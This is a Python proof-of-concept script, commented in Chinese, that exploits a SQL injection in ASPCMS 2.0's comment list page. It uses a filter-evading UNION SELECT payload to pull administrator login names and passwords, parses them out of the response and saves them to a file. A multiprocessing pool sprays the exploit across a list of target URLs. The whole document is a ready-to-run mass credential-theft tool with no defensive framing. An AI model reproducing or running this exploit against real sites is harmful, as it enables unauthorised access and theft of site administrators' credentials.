# conding:utf-8
import requests
import re
import urllib3
urllib3.disable_warnings()
from multiprocessing import Pool


#aspcms2.0 注入后台账号密码
def poc(url):
	print(url)
	headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
	payload="/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user"
	try:
		url1=url+payload
		res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
		if res.status_code==200 and 'IP' in res.text:
			html=res.text
			users=re.search('评论者：(.*) IP',html)
			passd=re.search('"line2">(.*)</div>',html)
			users=users.group(1)
			password=passd.group(1)
			print(f"{url}|aspcms2.0注入")
			with open("vuln.txt",'a+') as f:
				f.write(f"{url}|aspcms2.0注入---"+url+"--user:"+users+"--pass:"+password)
				f.close()
		else:
			pass
	except EOFError as e:
		print(e)


if __name__ == '__main__':
	p = Pool(50)
	URLS=[]
	for i in open("url.txt",encoding='utf-8'):
		URLS.append(i.strip('\n'))
	for k in URLS:
		p.apply_async(poc,args=(k,))
	p.close()
	p.join()